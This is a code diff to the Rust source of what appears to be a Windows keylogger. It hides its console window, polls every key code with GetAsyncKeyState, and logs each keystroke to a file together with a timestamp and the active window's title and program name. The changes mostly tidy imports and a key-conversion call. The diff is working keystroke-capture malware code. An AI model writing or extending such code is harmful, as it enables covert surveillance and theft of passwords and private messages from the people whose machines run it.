@@ -1,19 +1,21 @@
 #![windows_subsystem = "windows"]
 
 #[cfg(windows)]
-extern crate winapi;
+use winapi;
 
-extern crate chrono;
-extern crate os_info;
-extern crate hostname;
+use os_info;
+use hostname;
 
-use std::fs::*;
-use std::io::*;
-use chrono::{DateTime, Utc, Timelike};
+//use std::fs::*;
+
+use std::io::Write;
+use std::fs::{ File, OpenOptions };
+use chrono::{self, DateTime, Utc, Timelike};
 
 mod keys;
 
 use crate::keys::{ Key, Position };
+
 
 #[cfg(windows)]
 fn run(file: &mut File) {
@@ -95,10 +97,12 @@ fn run(file: &mut File) {
 
         let now: DateTime<Utc> = Utc::now();
 
-        for i in 0 as c_int..255 as c_int {
+        for i in (0 as c_int)..255 {
+            let mut keys = vec![];
             let key = unsafe { GetAsyncKeyState(i) };
 
             if (key & 1) > 0 {
+                &keys.push(Key::from(key as u8));
                 let s = format!("[{:02}:{:02}:{:02}][{}][{}][{}]\n",
                                 now.hour(), now.minute(), now.second(),
                                 filename.trim(), title.trim(), keycode_to_string(i as u8));
@@ -134,7 +138,7 @@ fn log(file: &mut File, s: String) {
 }
 
 fn keycode_to_string(k: u8) -> String {
-    format!("{:?}", Key::from_u8(k))
+    format!("{:?}", Key::from(k))
 }
 
 fn get_mouse_pos() -> Position {
